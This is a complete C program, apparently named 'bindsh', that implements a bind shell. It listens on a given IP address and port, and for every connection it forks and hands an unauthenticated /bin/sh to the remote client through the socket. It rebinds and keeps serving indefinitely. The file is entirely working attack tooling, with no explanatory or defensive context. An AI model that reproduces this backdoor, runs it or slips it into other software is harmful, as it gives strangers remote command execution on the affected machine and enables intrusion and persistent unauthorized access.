#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/time.h>

int main(int argc, char **argv) {
    if (argc < 3) { fprintf(stderr, "gebruik: bindsh <ip> <poort>\n"); return 1; }
    signal(SIGCHLD, SIG_IGN);
    for (;;) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        int one = 1; setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);
        struct sockaddr_in a; memset(&a, 0, sizeof a);
        a.sin_family = AF_INET; a.sin_port = htons(atoi(argv[2]));
        if (inet_pton(AF_INET, argv[1], &a.sin_addr) != 1) return 1;
        if (bind(s, (struct sockaddr *)&a, sizeof a) < 0 || listen(s, 4) < 0) {
            close(s); sleep(2); continue;
        }
        for (;;) {
            int c = accept(s, 0, 0);
            if (c < 0) break;
            if (fork() == 0) {
                close(s);
                dup2(c, 0); dup2(c, 1); dup2(c, 2); if (c > 2) close(c);
                execl("/bin/sh", "sh", (char *)0); _exit(127);
            }
            close(c);
        }
        close(s); sleep(1);
    }
}
